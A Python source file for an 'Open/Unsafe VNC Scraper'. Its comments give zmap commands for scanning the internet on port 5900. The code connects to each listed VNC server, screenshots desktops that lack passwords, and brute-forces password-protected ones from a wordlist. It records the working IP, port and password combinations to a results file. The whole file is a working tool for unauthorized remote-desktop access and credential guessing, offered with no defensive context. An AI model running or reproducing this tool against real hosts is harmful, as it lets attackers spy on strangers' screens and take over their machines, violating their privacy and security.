import os
from multiprocessing import Process, Pool, Value, Lock	
from ctypes import c_int
import subprocess
from datetime import datetime
import time
from io import StringIO
from vncdotool import api
import argparse

parser = argparse.ArgumentParser(description="Open/Unsafe VNC Scraper")
parser.add_argument("-input", help="Input IP list file")
parser.add_argument("-port", help="VNC connection port", type=int)
parser.add_argument("-proc_count", help="Multithreaded process count", type=int)
parser.add_argument("-connection_timeout", help="VNC connection timeout", type=int)
parser.add_argument("-screenshot_timeout", help="Screenshot attempt timeout", type=int)
parser.add_argument("--no_screenshots", help="Disable server screenshots", action="store_true")
parser.add_argument("--no_passwords", help="Disable basic password checks", action="store_true")
args = parser.parse_args()

#install vncdotool, but don't need to import. Also install zmap

#sudo zmap -B 10M -p 5900 -n 500000 -o results.txt
#sudo zmap -B 10M -p 5900 -n 1000000000 -o results.txt    2.5 days/60 hours
#sudo zmap -B 10M -p 5900 -n 16666666 -o results.txt    1 hour

vncport = "5900"
#Timeout in seconds
connection_timeout = 10
#screenshots can take minutes..
screenshot_timeout = 180
process_amount = 50
#replaces the backslashes in os.getcwd with forward slashes.
screenshot_path = os.getcwd().replace('\\', '/') + "/results/screenshots/"

password_file = "./passwords.txt"
ipfile = "./pw_results.txt"
valid_ipfile = "./results/" + time.strftime("%Y%m%d-%H%M%S") + "_validips.txt"
password_ipfile = "./results/" + time.strftime("%Y%m%d-%H%M%S") + "_passwordips.txt"

password_check = not args.no_passwords
skip_screencapture = args.no_screenshots
if args.input:
    ipfile = args.input
if args.port:
    vncport = str(args.port)
if args.connection_timeout:
    connection_timeout = args.connection_timeout
if args.screenshot_timeout:
    screenshot_timeout = args.screenshot_timeout
if args.proc_count:
    process_amount = args.proc_count

if password_check:
    #Passwords to test every password-protected VNC server by, line-separated.
    passwords = [line.strip() for line in open(password_file)]

def screencapture(startendpts):
    #startendpts in format: [start:end] eg: [0,52] [53, 106]...
    start = startendpts[0]
    end = startendpts[1]
    passed_ips = []
    password_failed_ips = []    
    passed_amt = failed_amt = password_failed_amt = 0
    
    #Will NOT work in an IDLE with multiprocessing!
    for i in range(start, end):
        screenshot_starttime = datetime.now()
        vncserver = vncservers[i]
        timestr = time.strftime("%Y%m%d-%H%M%S")
        #screenshot_filename = timestr + ".png"
        screenshot_filename = str(i+1) + "_" + vncserver + "_" + timestr + ".png"
        try:
            #Test connection
            client = api.connect(vncserver, password=None)
            client.timeout = connection_timeout
            client.connectionMade()
            print("Connection has established successfully to IP " + str(i + 1) + "/" + str(end) + ": " + vncserver)
            
            if not skip_screencapture:
                #Now restart. This is required.
                client = api.connect(vncserver, password=None)
                client.timeout = screenshot_timeout
                client.captureScreen(screenshot_path + screenshot_filename)
            
            client.disconnect()
        except Exception as e:
            if "Timeout" in str(e):
                failed_amt += 1
                None
                #print("Connection to IP " + str(i) + "/" + str(end) + " has timed out.")
            elif "password" in str(e):
                password_success = False
                correctpass = None
                if password_check:
                    for pw in passwords:
                        try:
                            client = api.connect(vncserver, password=pw)
                            client.timeout = connection_timeout
                            client.connectionMade()
                            client.disconnect()     
                        except:
                            pass
                        else:
                            correctpass = pw
                            password_success = True
                            break
                if password_success:
                    print("IP " + str(i + 1) + "/" + str(end) + " (" + vncserver + ") has passed because it has a password present in your password list: " + correctpass)
                    try:
                        client = api.connect(vncserver, password=correctpass)
                        client.timeout = screenshot_timeout
                        client.captureScreen(screenshot_path + screenshot_filename)
                        client.disconnect()            
                    except Exception as e:
                        print("IP " + str(i + 1) + "/" + str(end) + " (" + vncserver + ") password was found, but screenshot could not be taken. Exception: " + str(e))
                    else:
                        screenshot_endtime = datetime.now()
                        screenshot_duration = screenshot_endtime - screenshot_starttime
                        print(screenshot_filename + " screenshot taken in " + str(screenshot_duration.total_seconds()) + " seconds.")    
                        passed_amt += 1  
                        passed_ips.append(vncserver + ":" + vncport + ":" + correctpass)                         
                    
                else:
                    print("IP " + str(i + 1) + "/" + str(end) + " (" + vncserver + ") has failed because it requires a password you do not have.")
                    password_failed_amt += 1
                    password_failed_ips.append(vncserver + ":" + vncport)
            else:
                None
                print("Screencapture for IP " + str(i) + "/" + str(end) + " has failed: " + str(e))
                failed_amt += 1
        else:
            screenshot_endtime = datetime.now()
            screenshot_duration = screenshot_endtime - screenshot_starttime
            print(screenshot_filename + " screenshot taken in " + str(screenshot_duration.total_seconds()) + " seconds.")    
            passed_amt += 1  
            passed_ips.append(vncserver + ":" + vncport)
    
    resultsdict = {}
    resultsdict['passed_ips'] = passed_ips
    resultsdict['password_failed_ips'] = password_failed_ips
    resultsdict['password_failed_amt'] = password_failed_amt
    resultsdict['passed_amt'] = passed_amt
    resultsdict['failed_amt'] = failed_amt
    return resultsdict     
    
        
        
def readipfile():
    servers = []
    with open(ipfile) as fp:
        for line in fp:
            servers.append(line.strip())
    return servers

vncservers = readipfile()
if not os.path.exists(screenshot_path):
    os.makedirs(screenshot_path)   
serveramt = len(vncservers)
split_serveramt = int(serveramt / process_amount)

print("IPs to attempt to screen capture: " + str(serveramt) + ". There will be " + str(process_amount) + " processes handling " + str(split_serveramt) + " IPs each.")


if __name__ == '__main__':
    processlist = []
    xypairs = []
    for g in range(process_amount):
        x = split_serveramt * g
        y = split_serveramt * (g + 1)
        xypair = [x, y]
        xypairs.append(xypair)
    
    #print(xypairs)
    pool = Pool(processes=len(xypairs))
    result_list = pool.map(screencapture, xypairs)
    print("results: ")
    passed_amt = password_failed_amt = failed_amt = 0
    passed_ips = []
    password_failed_ips = []
    
    for result in result_list:
        passed_amt += result['passed_amt']
        password_failed_amt += result['password_failed_amt']
        failed_amt += result['failed_amt']
        for ip in result['password_failed_ips']:
            password_failed_ips.append(ip)
        for ip in result['passed_ips']:
            passed_ips.append(ip)
        
             
#Will not go further until all of the process_amount have finished.
print("Screencaptures have finished. Passed: " + str(passed_amt) + ". Password failed: " + str(password_failed_amt) + ". Failed: " + str(failed_amt) + ".")
print("Writing passed IPs to file.")
with open(valid_ipfile, "w") as myfile:
    for ip in passed_ips:
        myfile.write(ip + "\n")    
print("Passed IPs have been written to " + valid_ipfile)
print("Writing password-failed IPs to file.")
with open(password_ipfile, "w") as myfile:
    for ip in password_failed_ips:
        ip += "\n"
        myfile.write(ip)  
        
print("Password-failed IPs have been written to " + password_ipfile)
